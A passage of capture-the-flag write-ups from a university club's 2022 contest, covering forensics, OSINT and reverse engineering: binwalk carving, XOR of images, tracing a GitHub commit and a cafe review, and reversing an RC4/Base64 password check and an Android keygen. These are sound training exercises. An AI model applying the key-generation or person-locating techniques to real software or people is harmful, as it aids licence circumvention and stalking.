PICTURE!</p>\n<p>The format of the flag is f0rtn1ght{what_you_found} with “what_you_found” is what you found after solving the challenge.</p>\n<h3>Hints</h3>\n<ul>\n<li>Maybe there’s a mode of displaying the sound files such that it will reveal something?</li>\n<li>Hmm, the name of the tool must be somewhere in the poem.</li>\n<li>It seems the header of that file is changed somehow, how can we change it back?</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/blob/main/write-up/Fortnight%20Challenge%202022/Forensics/CAPTURE%20THE%20FLAG/FLAG_1.WAV?raw=true\">FLAG_1.WAV</a></li>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/blob/main/write-up/Fortnight%20Challenge%202022/Forensics/CAPTURE%20THE%20FLAG/FLAG_2.PNG?raw=true\">FLAG_2.PNG</a></li>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/blob/main/write-up/Fortnight%20Challenge%202022/Forensics/CAPTURE%20THE%20FLAG/FLAG_3?raw=true\">FLAG_3</a></li>\n</ul>\n<h3>Summary</h3>\n<p>Spectrogram in Audacity, binwalk, hexedit gives 8 coordinates, the first letters of each country is the flag.</p>\n<h3>Detailed solution</h3>\n<p>For the first file, it’s a .wav file with nothing interesing going on when listening to it. However, opening it in Audacity under spectrogram mode reveals 3 sets of coordinates.<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160265097-77cd845f-e1ed-45aa-983f-ac7d6def941b.png\" alt=\"image\"><br>\n45,4215N, 75.6972W<br>\n23.5880N, 58.3829E<br>\n27.7172N, 85.3240E</p>\n<p>For the second file, the solution to the riddle is of course the capital letters of each line - binwalk.<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160265103-bdb2e68f-3107-4ddf-9166-6fe019f1836f.png\" alt=\"image\"><br>\nRunning <code>binwalk FLAG_2.PNG</code> on it reveals that there’s a .rar file hidden inside.</p>\n<pre><code>$ binwalk FLAG_2.PNG\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 966 x 669, 8-bit/color RGB, non-interlaced\n91            0x5B            Zlib compressed data, compressed\n29086         0x719E          RAR archive data, version 5.x\n5646435       0x562863        StuffIt Deluxe Segment (data): f\n13090889      0xC7C049        Qualcomm device tree container, version: 1671221820, DTB entries: 1392494259\n</code></pre>\n<p>We can carve out the files using <code>binwalk -e FLAG_2.PNG</code>. After extracting it, we find a good_job.pdf file, and at the last page of the pdf, we find another set of coordinates.<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160265110-956ffd24-d0b3-4cfe-b5dc-e338b8482ff3.png\" alt=\"image\"><br>\n64.1814N, 51.6941W<br>\n44.4268N, 26.1025E<br>\n35.2802S, 149.1310E</p>\n<p>For the third file, since there’s no file extension, we can try running xxd on it to check its header.</p>\n<pre><code>$ xxd -l 64 FLAG_3\n00000000: 6969 6969 0010 4a46 4946 0001 0101 0048  iiii..JFIF.....H\n00000010: 0048 0000 ffe1 0022 4578 6966 0000 4d4d  .H.....&quot;Exif..MM\n00000020: 002a 0000 0008 0001 0112 0003 0000 0001  .*..............\n00000030: 0001 0000 0000 0000 fffe 000d 4170 706c  ............Appl\n</code></pre>\n<p>The file seems to be a JFIF file, but the first for bytes (69 69 69 69) are obviously edited. A quick Google search shows that it’s supposed to be FF D8 FF E0. Using <a href=\"https://hexed.it/\">hexedit</a> to correct the header, it turns out the file is an image with 2 final coordinates.<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160265122-2dec9507-3183-4a86-bbaf-f5e63e003a22.png\" alt=\"image\"><br>\n39.9334N, 32.8597E<br>\n59.3293N, 18.0686E</p>\n<p>The 8 coordinates points to capitals of 8 different countries:<br>\nOttawa,     Canada<br>\nMuscat,     Oman<br>\nKathmandu,  Nepal<br>\nNuuk,       Greenland<br>\nBucharest,  Romania<br>\nCanberra,   Australia<br>\nAnkara,     Turkey<br>\nStockholm,  Sweden</p>\n<p>Since the challenge description tells us to stop looking at the capitals and instead focus on the big picture, we can piece the first letters of each contries to form the word: CONGRATS.</p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{CONGRATS}\n</code></pre>\n","list":[]},{"name":"Gogeta Gotenks","tags":["https://img.shields.io/badge/Category-Forensics-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg","https://img.shields.io/badge/Solves-9-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Gogeta Gotenks</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Forensics-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-9-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>I just fished 2 pictures out from the trashbin. I don’t need both of them at once tho, just one at a time is enough. How can I retrieve anything from these images?</p>\n<h3>Hints</h3>\n<ul>\n<li>None</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/blob/main/write-up/Fortnight%20Challenge%202022/Forensics/Gogeta%20Gotenks/img_1.png?raw=true\">img_1.png</a></li>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/blob/main/write-up/Fortnight%20Challenge%202022/Forensics/Gogeta%20Gotenks/img_2.png?raw=true\">img_2.png</a></li>\n</ul>\n<h3>Summary</h3>\n<p>Xor the two images together.</p>\n<h3>Detailed solution</h3>\n<p>The challenge description seems to indicate that we should xor the two images together. A quick <a href=\"https://stackoverflow.com/questions/8504882/searching-for-a-way-to-do-bitwise-xor-on-images\">search from Google</a> returns a convenient console command:</p>\n<pre><code>convert img1 img2 -fx &quot;(((255*u)&amp;(255*(1-v)))|((255*(1-u))&amp;(255*v)))/255&quot; img_out\n</code></pre>\n<p>Substitute in the correct filenames:</p>\n<pre><code>convert img_1.png img_2.png -fx &quot;(((255*u)&amp;(255*(1-v)))|((255*(1-u))&amp;(255*v)))/255&quot; flag.png\n</code></pre>\n<p>And we get the flag image:<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160264962-6cf88adb-edbb-40ca-ac52-36f452c42a52.png\" alt=\"flag\"></p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{1_l1ke_x0ring_stuff}\n</code></pre>\n","list":[]}]},{"name":"Osint","tags":[],"detail":"","list":[{"name":"Barbie Goin' Bad","tags":["https://img.shields.io/badge/Category-OSINT-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-niche%233259-blue.svg","https://img.shields.io/badge/Solves-7-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Barbie Goin’ Bad</h2>\n<p><img src=\"https://img.shields.io/badge/Category-OSINT-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-niche%233259-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-7-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>Welcome detectives and OSINT lovers (and also stalkers)!!! We have an emergency on finding an anonymous user involved in a mysterious case. Help us find that person, here is your clue: “Coding, Nicki Minaj, OSINT lover”.</p>\n<h3>Hints</h3>\n<ul>\n<li>When coding, where do you usually upload your code to?</li>\n<li>Maybe you can search for something on that platform.</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li>None</li>\n</ul>\n<h3>Summary</h3>\n<p>The flag is in an old commit of a user on Github.</p>\n<h3>Detailed solution</h3>\n<p>From the “Coding” clue, we can relate to Github. From that, simply search using the term “nicki minaj osint lover” and we can find a suspicious account that was created only recently.<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160265208-58a29203-19ec-47af-84f0-61680e19774e.png\" alt=\"image\"><br>\nThe account has 2 repository, one of which conveniently titled “my_very_secured_flags”. However, looking in the flag.txt file, we only find the string <code>Sorry flag not here anymore :(</code><br>\nGoing throught the file’s commit history, we can find the flag: <code>f0rtn1ght{G1thub_1s_n00b}</code>\n<img src=\"https://user-images.githubusercontent.com/100995040/160265222-c4cc533b-3178-47d8-b559-d90c6549e604.png\" alt=\"Screenshot 2022-03-27 102032\"></p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{G1thub_1s_n00b}\n</code></pre>\n","list":[]},{"name":"Save me senpai","tags":["https://img.shields.io/badge/Category-OSINT-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg","https://img.shields.io/badge/Solves-25-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Save me senpai</h2>\n<p><img src=\"https://img.shields.io/badge/Category-OSINT-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-SpookyFish%234588-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-25-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>I’ve just got to HCM City yesterday but spookyfish is now holding me captive at this coffee place to make CTF challenges. I just left a review of this place on Google Maps. Please find where it is and come save me. Quick!</p>\n<h3>Hints</h3>\n<ul>\n<li>None</li>\n</ul>\n<h3>Attached files</h3>\n<ul>\n<li><a href=\"https://github.com/compsec-hcmus/hcmus-wu/blob/main/write-up/Fortnight%20Challenge%202022/Osint/Save%20me%20senpai/save_me_pls.jpg?raw=true\">save_me_pls.png</a></li>\n</ul>\n<h3>Summary</h3>\n<p>Use Photoshop to stack the images of the places in the pictures together to find where it is.</p>\n<h3>Detailed solution</h3>\n<p>[Provide the detailed solution of the ctf here.]\nFrom the clues in the challenge description we can deduce that the person is in a coffee place in HCM City, and the flag is in the review section of that place on Google Maps.<br>\nLooking at the picture, we can see that the person is in The Coffee House, however, there are more than 15 TCH in HCMC. Of course one can check the reviews of each TCH to find the flag, but doing so strips the challenge of its magic.<br>\nSo I propose a way to pin point exactly where the flag is.<br>\nLooking once again at the picture, we see that there is a Pharmacity and a Ministop in front of the TCH place.<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160240007-2ebf3fcc-72e8-4813-93c1-6c7beeeb6d86.jpg\" alt=\"save_me_pls\"></p>\n<p>So by searching every TCH, Pharmacity, and Ministop, take a picture, then stack them onto each other, we can see where the three places intersect, and that place should contain the flag.</p>\n<p>The TCH places in HCMC:<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160239898-7c2ac801-d9f7-44e2-b7cd-eacd70df915b.png\" alt=\"tch1\"><br>\nThe Pharmacity places in HCMC stack on top of the TCH places:<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160239910-f34c9209-eb1a-4b91-bbcf-ae3362b80311.png\" alt=\"tch2\"><br>\nThe Ministop places in HCMC stack on top of Pharmacity and TCH places:<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160239914-b66df000-a1a7-4d41-95ae-367c04177d83.png\" alt=\"tch3\"><br>\nThere is indeed only one place that fits the scheme:<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160239920-926c20f4-329a-47f5-b691-e83d8c875ec8.png\" alt=\"tch\"><br>\nLooking in the reviews, we find the flag.<br>\n<img src=\"https://user-images.githubusercontent.com/100995040/160239925-8d74e39a-8b2f-4603-8320-4dfce1787183.png\" alt=\"review\"></p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{y0u_f0und_m3}\n</code></pre>\n","list":[]}]},{"name":"Reverse engineering","tags":[],"detail":"","list":[{"name":"ARGGGGH","tags":["https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg","https://img.shields.io/badge/Author-xikhud-blue.svg"],"detail":"<h2>ARGGGGH</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg\" alt=\"Category\"><br>\n<img src=\"https://img.shields.io/badge/Author-xikhud-blue.svg\" alt=\"Author\"></p>\n<h3>Description</h3>\n<p>Can you crack the password for this challenge? If you think you can, prove it. Good luck!</p>\n<h3>Summary</h3>\n<p>Bài này sử dụng hai thuật toán nổi tiếng là RC4 và Base64. Ngoài ra nó còn sử dụng thủ thuật <a href=\"https://github.com/adamyaxley/Obfuscate\">compile-time string literal obfuscation</a>.</p>\n<h3>Detailed solution</h3>\n<p>Hàm <code>main</code>:</p>\n<pre><code class=\"language-c\">__int64 __fastcall <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> a1, <span class=\"hljs-type\">char</span> **a2, <span class=\"hljs-type\">char</span> **a3)</span>\n{\n  <span class=\"hljs-comment\">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&quot;+&quot; TO EXPAND]</span>\n\n  v19 = __readfsqword(<span class=\"hljs-number\">0x28</span>u);\n  v3 = sub_1588();\n  v4 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_1E84((__int64)v3);\n  <span class=\"hljs-built_in\">printf</span>(v4);\n  fgets(s, <span class=\"hljs-number\">256</span>, <span class=\"hljs-built_in\">stdin</span>);\n  s[<span class=\"hljs-built_in\">strlen</span>(s) - <span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">0</span>;\n  v16 = sub_24D9(s);\n  v5 = <span class=\"hljs-built_in\">strlen</span>(v16);\n  s1 = (<span class=\"hljs-type\">char</span> *)<span class=\"hljs-built_in\">calloc</span>(v5 + <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">1uLL</span>);\n  v6 = sub_16CC();\n  v7 = sub_1F32((__int64)v6);\n  sub_1500(v7, (__int64)v16, (__int64)s1);\n  v8 = sub_1844();\n  v9 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_1FE0((__int64)v8);\n  <span class=\"hljs-keyword\">if</span> ( !<span class=\"hljs-built_in\">strcmp</span>(s1, v9) )\n  {\n    v10 = sub_19CC();\n    v11 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_208E((__int64)v10);\n    <span class=\"hljs-built_in\">printf</span>(v11, s);\n  }\n  <span class=\"hljs-keyword\">else</span>\n  {\n    v12 = sub_1AE8(&amp;v15);\n    v13 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_213C(v12);\n    <span class=\"hljs-built_in\">printf</span>(v13);\n  }\n  <span class=\"hljs-built_in\">free</span>(s1);\n  <span class=\"hljs-built_in\">free</span>(v16);\n  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0LL</span>;\n}\n</code></pre>\n<p>Để ý rằng trong đoạn code trên có một số pattern như sau:</p>\n<pre><code class=\"language-c\">v3 = sub_XXXX();\nv4 = (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)sub_YYYY((__int64)v3);\n<span class=\"hljs-built_in\">printf</span>(v4); <span class=\"hljs-comment\">// use v4, don&#x27;t have to be printf</span>\n</code></pre>\n<p>Trong đó hàm <code>sub_XXXX</code> và <code>sub_YYYY</code> trông giống giống như sau:</p>\n<pre><code class=\"language-c\"><span class=\"hljs-type\">void</span> *<span class=\"hljs-title function_\">sub_XXXX</span><span class=\"hljs-params\">()</span>\n{\n  <span class=\"hljs-type\">char</span> v1[<span class=\"hljs-number\">40</span>]; <span class=\"hljs-comment\">// [rsp+20h] [rbp-40h] BYREF</span>\n  <span class=\"hljs-type\">unsigned</span> __int64 v2; <span class=\"hljs-comment\">// [rsp+48h] [rbp-18h]</span>\n\n  v2 = __readfsqword(<span class=\"hljs-number\">0x28</span>u);\n  v1[<span class=\"hljs-number\">0</span>] = <span class=\"hljs-number\">71</span>;\n  v1[<span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">-12</span>;\n  v1[<span class=\"hljs-number\">2</span>] = <span class=\"hljs-number\">-101</span>;\n  v1[<span class=\"hljs-number\">3</span>] = <span class=\"hljs-number\">43</span>;\n  v1[<span class=\"hljs-number\">4</span>] = <span class=\"hljs-number\">-119</span>;\n  v1[<span class=\"hljs-number\">5</span>] = <span class=\"hljs-number\">71</span>;\n  v1[<span class=\"hljs-number\">6</span>] = <span class=\"hljs-number\">-113</span>;\n  v1[<span class=\"hljs-number\">7</span>] = <span class=\"hljs-number\">119</span>;\n  v1[<span class=\"hljs-number\">8</span>] = <span class=\"hljs-number\">121</span>;\n  v1[<span class=\"hljs-number\">9</span>] = <span class=\"hljs-number\">-20</span>;\n  v1[<span class=\"hljs-number\">10</span>] = <span class=\"hljs-number\">-101</span>;\n  v1[<span class=\"hljs-number\">11</span>] = <span class=\"hljs-number\">56</span>;\n  v1[<span class=\"hljs-number\">12</span>] = <span class=\"hljs-number\">-38</span>;\n  v1[<span class=\"hljs-number\">13</span>] = <span class=\"hljs-number\">86</span>;\n  v1[<span class=\"hljs-number\">14</span>] = <span class=\"hljs-number\">-57</span>;\n  v1[<span class=\"hljs-number\">15</span>] = <span class=\"hljs-number\">119</span>;\n  v1[<span class=\"hljs-number\">16</span>] = <span class=\"hljs-number\">55</span>;\n  v1[<span class=\"hljs-number\">17</span>] = <span class=\"hljs-number\">-24</span>;\n  v1[<span class=\"hljs-number\">18</span>] = <span class=\"hljs-number\">-97</span>;\n  v1[<span class=\"hljs-number\">19</span>] = <span class=\"hljs-number\">57</span>;\n  v1[<span class=\"hljs-number\">20</span>] = <span class=\"hljs-number\">-119</span>;\n  v1[<span class=\"hljs-number\">21</span>] = <span class=\"hljs-number\">85</span>;\n  v1[<span class=\"hljs-number\">22</span>] = <span class=\"hljs-number\">-64</span>;\n  v1[<span class=\"hljs-number\">23</span>] = <span class=\"hljs-number\">96</span>;\n  v1[<span class=\"hljs-number\">24</span>] = <span class=\"hljs-number\">115</span>;\n  v1[<span class=\"hljs-number\">25</span>] = <span class=\"hljs-number\">-94</span>;\n  v1[<span class=\"hljs-number\">26</span>] = <span class=\"hljs-number\">-34</span>;\n  v1[<span class=\"hljs-number\">27</span>] = <span class=\"hljs-number\">74</span>;\n  <span class=\"hljs-keyword\">if</span> ( (_BYTE)byte_5060 || !__cxa_guard_acquire(&amp;byte_5060) )\n    <span class=\"hljs-keyword\">return</span> &amp;unk_5040;\n  sub_1DF8(&amp;unk_5040, v1);\n  __cxa_guard_release(&amp;byte_5060);\n  __cxa_atexit(func, &amp;unk_5040, &amp;dso_handle);\n  <span class=\"hljs-keyword\">return</span> &amp;unk_5040;\n}\n\n__int64 __fastcall <span class=\"hljs-title function_\">sub_YYYY</span><span class=\"hljs-params\">(__int64 a1)</span>\n{\n  __int64 result; <span class=\"hljs-comment\">// rax</span>\n\n  result = *(<span class=\"hljs-type\">unsigned</span> __int8 *)(a1 + <span class=\"hljs-number\">28</span>);\n  <span class=\"hljs-keyword\">if</span> ( !(_BYTE)result )\n    <span class=\"hljs-keyword\">return</span> result;\n  sub_1D91(a1, <span class=\"hljs-number\">28LL</span>, <span class=\"hljs-number\">0x12AF22FA4AFE9817</span>LL); <span class=\"hljs-comment\">// xor with [0x17, 0x98, 0xFE, 0x4A, 0xFA, 0x22, 0xAF, 0x12]</span>\n  result = a1;\n  *(_BYTE *)(a1 + <span class=\"hljs-number\">28</span>) = <span class=\"hljs-number\">0</span>;\n  <span class=\"hljs-keyword\">return</span> result;\n}\n</code></pre>\n<p>Khi đó đoạn code trên sẽ xor <code>[71, -12, -101, 43, ...]</code> với <code>[0x17, 0x98, 0xFE, 0x4A, 0xFA, 0x22, 0xAF, 0x12]</code> cho ra chuỗi <code>&quot;Please enter the password: &quot;</code></p>\n<p>Các pattern khác làm tương tự. Đây chính là <a href=\"https://github.com/adamyaxley/Obfuscate\">compile-time string literal obfuscation</a>.</p>\n<p>Đầu tiên input của chúng ta được đưa vào hàm <code>sub_24D9</code>. Hàm này thực chất là hàm base64 encode, nhưng làm sao để nhận diện hàm này? Có 1 số cách:</p>\n<ul>\n<li>Dùng debugger để quan sát return value sau khi chạy hàm này, sẽ thấy tất cả các character của nó đều thuộc khoảng A-Z, a-z, 0-9 và +, /.</li>\n<li>Đọc code của hàm <code>sub_24D9</code> thấy có chỗ <code>malloc(4 * v1 / 3 + 4)</code> với <code>v1</code> là độ dài chuỗi input. Thuật toán encode mà làm cho độ dài của chuỗi dài thêm 4/3 lần chính là base64.</li>\n</ul>\n<p>Tuy nhiên khi các bạn quan sát giá trị sau khi base64 encode thì sẽ thấy nó không chính xác so với việc các bạn tự encode. Đó là vì hàm base64 encode của mình sử dụng custom alphabet (xem hàm <code>sub_2302</code>).</p>\n<p><code>abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/</code></p>\n<p>Sau khi được base64 encode, nó lại được RC4 encrypt tại hàm <code>sub_1500</code>. Có 1 số cách để biết được hàm này là RC4, đã được viết trên fanpage, <a href=\"https://www.facebook.com/hcmus.compsec.club/posts/482321203493081\">tại đây</a>.</p>\n<p>Cuối cùng, sau khi được RC4 encrypt (với key là <code>&quot;YEKDx2ZoxDcCFZzjnhx8Vx8y9mp7DySPhKipmz0s&quot;</code>), nó sẽ được so sánh với một chuỗi hardcode bằng hàm <code>strcmp</code>. Từ đó ta dễ dàng tìm được flag là</p>\n<pre><code>flag = CustomBase64(RC4Decrypt(hardcode_string,  &quot;YEKDx2ZoxDcCFZzjnhx8Vx8y9mp7DySPhKipmz0s&quot;))\n</code></pre>\n<p><img src=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Reverse%20engineering/ARGGGGH/img.png\" alt=\"img.png\">\n<a href=\"https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')RC4(%7B'option':'UTF8','string':'YEKDx2ZoxDcCFZzjnhx8Vx8y9mp7DySPhKipmz0s'%7D,'Latin1','Latin1')From_Base64('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/',true)&amp;input=XHhjNVx4ZjRceGNlXHgwM1x4MmFceGQyXHhmZlx4MzhceDFlXHhiZFx4NjdceDQ5XHhlNFx4MTBceGU2XHg4Nlx4MTFceGU4XHgzYlx4MTBceDE4XHg4Nlx4ZGZceGVmXHhhOFx4YTdceDk4XHgzOFx4NjlceGFiXHhjNFx4ZWVceGUxXHg1YVx4NGFceDU0XHg4Ylx4ZTFceDAzXHgyMVx4NWNceGFmXHgxM1x4NmU\">----------------------- Link để test -----------------------</a>.</p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{arc4_And_base64_boizzz}\n</code></pre>\n","list":[]},{"name":"SecureKeygen","tags":["https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg","https://img.shields.io/badge/Author-xikhud-blue.svg"],"detail":"<h2>SecureKeygen</h2>\n<p><img src=\"https://img.shields.io/badge/Category-Reverse_Engineering-brightgreen.svg\" alt=\"Category\"><br>\n<img src=\"https://img.shields.io/badge/Author-xikhud-blue.svg\" alt=\"Author\"></p>\n<h3>Description</h3>\n<p>You dont have to buy a license if you can generate one. Please find a correct key for user “hcmus@fortnight”. The flag will be “f0rtn1ght{key}” (key is in lowercase)</p>\n<h3>Hints</h3>\n<ol>\n<li>Check function is written in C, not Java.</li>\n<li><a href=\"https://www.ragingrock.com/AndroidAppRE/reversing_native_libs.html\">Reference</a></li>\n<li><a href=\"https://frida.re/\">Instrumentation tool</a></li>\n</ol>\n<h3>Summary</h3>\n<p>Bài này thuật toán tạo key khá dễ, nhưng quan trọng là phải biết hàm tạo key nằm ở chỗ nào.</p>\n<h3>Detailed solution</h3>\n<p>Bài này có hai cách giải, một cách là static, tức là chỉ đọc và phân tích code, còn cách thứ hai là dynamic, ở cách này thay vì hiểu code thì ta sẽ quan sát các giá trị trong hàm check bằng tool <a href=\"https://frida.re/\">frida</a>.</p>\n<p>Đầu tiên mở app lên chạy\n<img src=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Reverse%20engineering/SecureKeygen/bluestack.png\" alt=\"bluestack.png\">\nApp khá cơ bản, chỉ có 2 ô để nhập input và một nút check. Ta cần tìm một key hợp lệ cho <code>&quot;hcmus@fortnight&quot;</code>. Để decompile file apk, ta dùng tool <a href=\"https://github.com/skylot/jadx\">jadx</a> hoặc bất cứ tool nào mà các bạn biết là nó có thể decompile file apk.</p>\n<pre><code class=\"language-java\"><span class=\"hljs-keyword\">package</span> com.example.securekeygen;\n\n<span class=\"hljs-keyword\">import</span> android.os.Bundle;\n<span class=\"hljs-keyword\">import</span> android.view.View;\n<span class=\"hljs-keyword\">import</span> android.widget.Button;\n<span class=\"hljs-keyword\">import</span> android.widget.EditText;\n<span class=\"hljs-keyword\">import</span> android.widget.Toast;\n<span class=\"hljs-keyword\">import</span> androidx.appcompat.app.AppCompatActivity;\n\n<span class=\"hljs-comment\">/* loaded from: classes.dex */</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MainActivity</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_\">AppCompatActivity</span> {\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">native</span> <span class=\"hljs-type\">boolean</span> <span class=\"hljs-title function_\">check</span><span class=\"hljs-params\">(String str, String str2)</span>;\n\n    <span class=\"hljs-keyword\">static</span> {\n        System.loadLibrary(<span class=\"hljs-string\">&quot;nativeCheck&quot;</span>);\n    }\n\n    <span class=\"hljs-meta\">@Override</span> <span class=\"hljs-comment\">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>\n    <span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">onCreate</span><span class=\"hljs-params\">(Bundle bundle)</span> {\n        <span class=\"hljs-built_in\">super</span>.onCreate(bundle);\n        setContentView(R.layout.activity_main);\n        ((Button) findViewById(R.id.checkButton)).setOnClickListener(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">View</span>.OnClickListener() { <span class=\"hljs-comment\">// from class: com.example.securekeygen.MainActivity.1</span>\n            <span class=\"hljs-meta\">@Override</span> <span class=\"hljs-comment\">// android.view.View.OnClickListener</span>\n            <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">onClick</span><span class=\"hljs-params\">(View view)</span> {\n                <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">obj</span> <span class=\"hljs-operator\">=</span> ((EditText) MainActivity.<span class=\"hljs-built_in\">this</span>.findViewById(R.id.nameEditText)).getText().toString();\n                <span class=\"hljs-keyword\">if</span> (MainActivity.<span class=\"hljs-built_in\">this</span>.check(obj, ((EditText) MainActivity.<span class=\"hljs-built_in\">this</span>.findViewById(R.id.keyEditText)).getText().toString())) {\n                    Toast.makeText(MainActivity.<span class=\"hljs-built_in\">this</span>.getApplicationContext(), String.format(<span class=\"hljs-string\">&quot;Nice, you have entered the correct key of \\&quot;%s\\&quot;&quot;</span>, obj), <span class=\"hljs-number\">0</span>).show();\n                } <span class=\"hljs-keyword\">else</span> {\n                    Toast.makeText(MainActivity.<span class=\"hljs-built_in\">this</span>.getApplicationContext(), String.format(<span class=\"hljs-string\">&quot;Wrong key for user \\&quot;%s\\&quot;&quot;</span>, obj), <span class=\"hljs-number\">0</span>).show();\n                }\n            }\n        });\n    }\n}\n</code></pre>\n<p>Ở trên là toàn bộ nội dung của <code>com.example.securekeygen.MainActivity</code>, có thể coi đây là hàm “main” trên app android.\nTa muốn vào nhánh in ra màn mình <code>&quot;Nice, you have entered ...&quot;</code>, khi đó cần có:</p>\n<pre><code class=\"language-java\">MainActivity.<span class=\"hljs-built_in\">this</span>.check(obj, ((EditText) MainActivity.<span class=\"hljs-built_in\">this</span>.findViewById(R.id.keyEditText)).getText().toString()) == <span class=\"hljs-literal\">true</span>\n</code></pre>\n<p>Hàm <code>check</code> sẽ thực hiện việc kiểm tra key và name xem có hợp lệ hay không, nhưng nếu nhìn trong đoạn code java của <code>MainActivity</code> thì sẽ không thấy code của hàm <code>check</code> đâu, mà chỉ thấy định nghĩa:</p>\n<pre><code class=\"language-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">native</span> <span class=\"hljs-type\">boolean</span> <span class=\"hljs-title function_\">check</span><span class=\"hljs-params\">(String str, String str2)</span>;\n</code></pre>\n<p>Đó là vì hàm này không được viết bằng code java mà nó được viết bằng C (hoặc C++). Trong <a href=\"https://www.ragingrock.com/AndroidAppRE/reversing_native_libs.html\">link ở hint</a> có hướng dẫn cách reverse những hàm như vậy. Các bạn có thể đọc link trên để tìm hiểu thêm, nhưng mình có thể tóm gọn lại các ý như sau:</p>\n<ul>\n<li>Nếu hàm đó tên là <code>check</code> thì tên hàm khi viết bằng C/C++ sẽ là <code>Java_com_example_securekeygen_MainActivity_check</code> (vì tên của package là <code>com.example.securekeygen</code>)</li>\n<li>Nếu trong code Java có đoạn code <code>System.loadLibrary(&quot;nativeCheck&quot;)</code> thì file chứa code C/C++ sẽ là file <code>libnativeCheck.so</code>. File này có thể lấy được bằng cách giải nén file apk ra và tìm ở tròng đó.</li>\n</ul>\n<blockquote>\n<p>File apk thật ra cũng chỉ là file zip, các bạn có thể đổi tên nó về thành .zip rồi dùng winrar để giải nén nó.</p>\n</blockquote>\n<p>Sau khi giải nén, các bạn sẽ tìm thấy tận 4 file có tên là 